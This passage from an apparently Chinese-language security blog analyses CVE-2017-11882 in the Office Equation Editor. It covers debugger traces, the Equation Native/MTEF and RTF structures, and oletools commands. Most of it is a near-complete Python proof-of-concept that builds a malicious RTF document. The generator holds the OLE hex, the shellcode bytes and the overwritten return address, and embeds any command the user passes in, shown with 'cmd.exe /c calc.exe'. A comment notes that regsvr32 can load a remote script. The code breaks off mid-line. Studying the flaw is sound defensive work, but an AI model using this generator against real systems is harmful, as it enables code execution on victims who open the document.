src="https://s1.ax1x.com/2023/07/20/pCHsW34.png" alt=""></p><p>第一次运行过后发现函数返回值并没有被覆盖：</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHagQx.png" alt=""></p><p>再次执行该函数，同样重点关注函数返回地址：</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHa4Te.png" alt=""></p><p>可以看到，第二次执行该函数时，函数的返回地址被修改：</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHa2y6.png" alt="image-20230719062221180"></p><p>可以看到返回值变成了<strong>0043C12</strong>，我们去看看这个地址，发现是<code>WinExec</code>函数的地址，之后由<code>WinExec</code>调用计算器程序：</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHaROK.png" alt=""></p><p>使用<a href="https://5ilr.lanzout.com/iGQy6082irhi">Pestudio</a>查看<strong>ENQEDT32.EXE</strong>的<code>ALSR</code>与<code>DEP</code>发现两个保护措施都是关闭的</p><p>分析poc代码的利用：定位到溢出点，双击<code>&amp;12</code>查看内存数据</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHahwD.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/07/20/pCHsQcd.png" alt="image-20230719075336911"></p><p>下图中，<strong>r</strong>是返回值，<code>arg_0</code>、<code>arg_4</code>、<code>arg_8</code>是参数，上下两图可以看出缓冲区大小为<strong>28h - 5 + 1 = 24h</strong></p><p><img src="https://s1.ax1x.com/2023/07/20/pCHsM1H.png" alt=""></p><p>下图是第二次运行到溢出点之后的截图，根据<code>rep movsd</code>我们知道注入的数据为<code>ecx * 4B</code>即30h的内容(注：ecx = 12)，根据EDI定位到内存数据，查看得到其注入的内容为<code>cmd.exe /c calc.exe</code></p><p>另外，注意看最后4个字节数据(一组十六进制数就是一个字节，例如：6D，这就是一组即两个十六进制数，就是一个字节)：倒过来看是 <strong>00 43 0c 12</strong>，这就是<code>WinExec</code>的函数地址</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHs3nI.png" alt=""></p><h2 id="理解RTF文档格式和Equation-Native数据流"><a href="#理解RTF文档格式和Equation-Native数据流" class="headerlink" title="理解RTF文档格式和Equation Native数据流"></a>理解RTF文档格式和Equation Native数据流</h2><p><strong>参考文章</strong>：</p><p><a href="https://www.anquanke.com/post/id/87311">【漏洞分析】CVE-2017-11882漏洞分析、利用及动态检测</a></p><p><a href="https://www.freebuf.com/column/183551.html">Office系列漏洞之CVE-2017-11882</a></p><h3 id="Equation-Native数据流"><a href="#Equation-Native数据流" class="headerlink" title="Equation Native数据流"></a>Equation Native数据流</h3><ul><li><code>Equation Native</code>数据流 = <code>EQNOLEFILEHDR</code> + <code>MTEFData</code></li><li><code>MTEFData</code> = <code>MTEFheader</code> + <code>MTEF Byte Stream</code></li></ul><p><code>EQNOLEFILEHDR</code>固定为28字节：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">struct EQNOLEFILEHDR &#123;</span><br><span class="line"></span><br><span class="line"> WORD  cbHdr;   // 格式头长度，固定为0x1C。</span><br><span class="line"></span><br><span class="line"> DWORD  version;  // 固定为0x00020000。</span><br><span class="line"></span><br><span class="line"> WORD  cf;     // 该公式对象的剪贴板格式。</span><br><span class="line"></span><br><span class="line"> DWORD  cbObject; // MTEF数据的长度，包括MTEF头部。</span><br><span class="line"></span><br><span class="line"> DWORD  reserved1; // 未公开</span><br><span class="line"></span><br><span class="line"> DWORD  reserved2; // 未公开</span><br><span class="line"></span><br><span class="line"> DWORD  reserved3; // 未公开</span><br><span class="line"></span><br><span class="line"> DWORD  reserved4; // 未公开</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>MTEFheader</strong>固定为5字节：</p><div class="table-container"><table><thead><tr><th style="text-align:center"><strong>byte</strong></th><th style="text-align:center"><strong>description</strong></th><th style="text-align:center"><strong>value</strong></th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">MTEF version</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">generating platform</td><td style="text-align:center">0 for Macintosh, 1 for Windows</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">generating product</td><td style="text-align:center">0 for MathType, 1 for Equation Editor</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">product version</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">product subversion</td><td style="text-align:center">0A</td></tr></tbody></table></div><h3 id="MTEFByte-Stream"><a href="#MTEFByte-Stream" class="headerlink" title="MTEFByte Stream"></a>MTEFByte Stream</h3><p><code>initial SIZE</code>开头，固定为<code>0A</code></p><p><img src="https://p2.ssl.qhimg.com/t0166794fa94c554a63.png" alt=""></p><div class="table-container"><table><thead><tr><th style="text-align:center"><strong>value</strong></th><th style="text-align:center"><strong>symbol</strong></th><th style="text-align:center"><strong>description</strong></th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#END_record">END</a></td><td style="text-align:center">end of MTEF, pile, line, embellishment  list, or template</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#LINE_record">LINE</a></td><td style="text-align:center">line (slot) record</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#CHAR_record">CHAR</a></td><td style="text-align:center">character record</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#TMPL_record">TMPL</a></td><td style="text-align:center">template record</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#PILE_record">PILE</a></td><td style="text-align:center">pile (vertical stack of lines) record</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#MATRIX_record">MATRIX</a></td><td style="text-align:center">matrix record</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#EMBELL_record">EMBELL</a></td><td style="text-align:center">character embellishment (e.g. hat, prime)  record</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#RULER_record">RULER</a></td><td style="text-align:center">ruler (tab-stop location) record</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#FONT_record">FONT</a></td><td style="text-align:center">font name record</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#SIZE_record">SIZE</a></td><td style="text-align:center">general size record</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records">FULL</a></td><td style="text-align:center">full size record</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records">SUB</a></td><td style="text-align:center">subscript size record</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records">SUB2</a></td><td style="text-align:center">sub-subscript size record</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records">SYM</a></td><td style="text-align:center">symbol size record</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records">SUBSYM</a></td><td style="text-align:center">sub-symbol size record</td></tr></tbody></table></div><p><strong>重点注意</strong><code>FONT record</code>，即<strong>value=0x08</strong>：</p><p><strong>Font record = tag(固定为8，占一个字节) + typeface(占一个字节) + style(占一个字节) + font_name(以0x00结尾的字符串)</strong></p><p><code>typeface</code>和<code>style</code>这两个字节的值不影响漏洞的触发</p><h3 id="RTF文档格式-了解-："><a href="#RTF文档格式-了解-：" class="headerlink" title="RTF文档格式(了解)："></a>RTF文档格式(了解)：</h3><p><img src="https://image.3001.net/images/20180907/1536302904_5b921f3889359.jpg!small" alt=""></p><p>其中，<code>objupdate</code>控制字来保证<code>OLE</code>(Object Linking and Embedding：对象链接与嵌入)对象的自动更新和加载，从而触发漏洞代码执行。默认状态下Office文档中的OLE Object需要用户双击才能生效。将OLE Object的属性为自动更新，这样无需交互，点击打开文档后OLE Object对象会生效，从而执行恶意代码。</p><h3 id="使用Oletools分析OLE对象"><a href="#使用Oletools分析OLE对象" class="headerlink" title="使用Oletools分析OLE对象"></a>使用Oletools分析OLE对象</h3><p><a href="https://github.com/decalage2/oletools">Oletools</a>包含一系列工具，包括<strong>rtfobj.py</strong>和<strong>olebrowse.py</strong>等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用rtfobj查看文档得到流文件信息同时会自动生成bin文件</span></span><br><span class="line">python rtfobj.py -s all C:\Users\DELL\Desktop\1.rtf// 缺少的依赖直接pip install </span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/07/20/pCHsljA.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledir.py C:\Users\DELL\Desktop\note.doc_object_000000FE.bin</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/07/20/pCHs8Bt.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用olebrowse查看Equation Native的具体信息</span></span><br><span class="line">python olebrowse.py C:\Users\DELL\Desktop\note.doc_object_000000FE.bin</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/07/20/pCHsGHP.png" alt="image-20230720005656016"></p><p><img src="https://s1.ax1x.com/2023/07/20/pCHsYAf.png" alt="image-20230720005713406"></p><p><img src="https://s1.ax1x.com/2023/07/20/pCHstN8.png" alt="image-20230720005727444"></p><p>通过上面这幅图分析<code>Equation Native</code>数据流：</p><p>开头的<code>1C</code>是<code>cbHdr</code>;   // 格式头长度</p><p>地址<code>0000 0008</code>开始的四个字节是 <strong>00 00 00 A9</strong>，即<code>MTEF</code>结构的长度</p><p>地址<code>0000 001C</code>开始，前五个字节是<code>MTEF Header</code></p><p>然后是<code>0A</code>对应<code>initial Size</code>，之后有一个<code>08</code>，对应<code>FONT</code>的<code>tag</code>：<strong>Font record = tag(固定为8，占一个字节) + typeface(占一个字节) + style(占一个字节) + font_name(以0x00结尾的字符串)</strong>，<code>font_name</code>中包含了攻击代码 <code>&quot;cmd.exe /c calc.exe&quot;</code></p><h2 id="poc代码解析："><a href="#poc代码解析：" class="headerlink" title="poc代码解析："></a>poc代码解析：</h2><p>看着很多很复杂，其实只要理解关键的地方就好，其余的不用过多关注</p><ol><li><p><code>argsparse</code>是python的命令行解析的标准模块，内置于python，不需要安装。这个库可以让我们直接在命令行中就可以向程序中传入参数并让程序运行。使用方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建解析对象</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"><span class="comment"># 添加参数，有很多可选参数</span></span><br><span class="line"><span class="comment"># parser.add_argument([], action=[], nargs=[], const=[], default=[], type=[], choices=[], required=[], help=[], metavar=[], dest=[])</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;square&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;display a square of a given number&quot;</span>)</span><br><span class="line"><span class="comment"># 解析参数</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="comment"># 使用参数</span></span><br><span class="line"><span class="built_in">print</span>(args.square ** <span class="number">2</span>)</span><br></pre></td></tr></table></figure></li><li><p>代码中的<code>head</code>(默认的rtf文件头)、<code>objclass</code>(公式对象)、<code>tail</code>(rtf文件尾部)、<code>stage1</code>(作者编写的shellcode的机器码)、<code>payload</code>(<code>Equation Native</code>数据流的<code>EQNOLEFILEHDR</code> + <code>MTEF</code>头部和<code>initial Size</code>与<code>Font</code>的<code>tag</code>)都是固定格式；</p></li><li><p>代码运行流程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Command109b_CVE-<span class="number">2017</span>-<span class="number">11882.</span>py -c <span class="string">&quot;cmd.exe /c calc.exe&quot;</span> -o cal.doc</span><br></pre></td></tr></table></figure><ul><li>创建解析对象并根据输入的命令解析参数</li><li>制作rft文件的头部，如果你传入了<code>rtf</code>文件，就用该<code>rtf</code>文件的头部信息；如果没有传就使用<code>head</code>作为rtf文件头部信息</li><li>制作<code>Equation Native</code>数据流：把使用者输入的<code>-c</code>参数嵌入到<code>Equation Native</code>数据流的<code>FontName</code>当中，对应代码第57行</li><li>代码第58行：197(10进制) = A9(16进制) + 28(10进制)    // <code>A9</code>对应<code>EQNOLEFILEHDR</code>的<code>cbObject</code>值，即<code>MTEF</code>的长度；28是<code>EQNOLEFILEHDR</code>的固有长度</li><li>将制作好的文件保存到<code>-o</code>参数指定的文件中</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Original poc :https://github.com/embedi/CVE-2017-11882</span></span><br><span class="line"><span class="comment"># This version accepts a command with 109 bytes long in maximum.</span></span><br><span class="line"><span class="comment"># Sorry I don&#x27;t know how to read the struct in objdata, hence I cannot modify the length parameter to aquire a arbitrary length code execution.</span></span><br><span class="line"><span class="comment"># But that&#x27;s enough in exploitation. We can use regsvr32 to load sct file remotely.:)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># rtf文件固有格式</span></span><br><span class="line">head=<span class="string">r&#x27;&#x27;&#x27;&#123;\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033&#123;\fonttbl&#123;\f0\fnil\fcharset0 Calibri;&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;\*\generator Riched20 6.3.9600&#125;\viewkind4\uc1</span></span><br><span class="line"><span class="string">\pard\sa200\sl276\slmult1\f0\fs22\lang9&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">objclass=<span class="string">r&#x27;&#x27;&#x27;&#123;\object\objemb\objupdate&#123;\*\objclass Equation.3&#125;\objw380\objh260&#123;\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tail=<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000</span></span><br><span class="line"><span class="string">&#125;&#123;\result &#123;\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 &#123;\pict&#123;\*\picprop\shplid1025&#123;\sp&#123;\sn shapeType&#125;&#123;\sv 75&#125;&#125;&#123;\sp&#123;\sn fFlipH&#125;&#123;\sv 0&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;\sp&#123;\sn fFlipV&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLockAspectRatio&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn pictureGray&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn pictureBiLevel&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fRecolorFillAsPicture&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fUseShapeAnchor&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fFilled&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fHitTestFill&#125;&#123;\sv 1&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;\sp&#123;\sn fillShape&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn fillUseRect&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fNoFillHitTest&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLine&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fPreferRelativeResize&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn fReallyHidden&#125;&#123;\sv 0&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;\sp&#123;\sn fScriptAnchor&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fFakeMaster&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fCameFromImgDummy&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLayoutInCell&#125;&#123;\sv 1&#125;&#125;&#125;\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0</span></span><br><span class="line"><span class="string">\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307&#123;\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652&#125;0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class="line"><span class="string">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000&#125;&#125;&#125;&#125;\par&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#0:  b8 44 eb 71 12          mov    eax,0x1271eb44</span></span><br><span class="line"><span class="comment">#5:  ba 78 56 34 12          mov    edx,0x12345678</span></span><br><span class="line"><span class="comment">#a:  31 d0                   xor    eax,edx</span></span><br><span class="line"><span class="comment">#c:  8b 08                   mov    ecx,DWORD PTR [eax]</span></span><br><span class="line"><span class="comment">#e:  8b 09                   mov    ecx,DWORD PTR [ecx]</span></span><br><span class="line"><span class="comment">#10: 8b 09                   mov    ecx,DWORD PTR [ecx]</span></span><br><span class="line"><span class="comment">#12: 66 83 c1 3c             add    cx,0x3c</span></span><br><span class="line"><span class="comment">#16: 31 db                   xor    ebx,ebx</span></span><br><span class="line"><span class="comment">#18: 53                      push   ebx</span></span><br><span class="line"><span class="comment">#19: 51                      push   ecx</span></span><br><span class="line"><span class="comment">#1a: be 64 3e 72 12          mov    esi,0x12723e64</span></span><br><span class="line"><span class="comment">#1f: 31 d6                   xor    esi,edx</span></span><br><span class="line"><span class="comment">#21: ff 16                   call   DWORD PTR [esi] // call WinExec</span></span><br><span class="line"><span class="comment">#23: 53                      push   ebx</span></span><br><span class="line"><span class="comment">#24: 66 83 ee 4c             sub    si,0x4c</span></span><br><span class="line"><span class="comment">#28: ff 10                   call   DWORD PTR [eax] // call ExitProcess</span></span><br><span class="line">stage1=<span class="string">&quot;\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用nop填充</span></span><br><span class="line">stage1=stage1.ljust(<span class="number">44</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genrtf</span>(<span class="params">cmd,r_head</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmd) &gt; <span class="number">109</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[!] Primitive command must be shorter than 109 bytes&quot;</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">&#x27;\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ&#x27;</span></span><br><span class="line">    payload+=stage1 </span><br><span class="line">    payload+=pack(<span class="string">&#x27;&lt;I&#x27;</span>,<span class="number">0x00402114</span>) <span class="comment"># ret 返回地址</span></span><br><span class="line">    payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span></span><br><span class="line">    payload+=cmd</span><br><span class="line">    payload=payload.ljust(<span class="number">197</span>,<span class="string">&#x27;\x00&#x27;</span>)   <span class="comment"># FONT NAME以0x00结尾  197 = 0xA9 + 28</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r_head+objclass+payload.encode(<span class="string">&#x27;hex&#x27;</span>)+tail</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrheader</span>(<span class="params">file</span>):</span><br><span class="line">    input_file = <span class="built_in">open</span>(file,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    r_header = input_file.split(<span 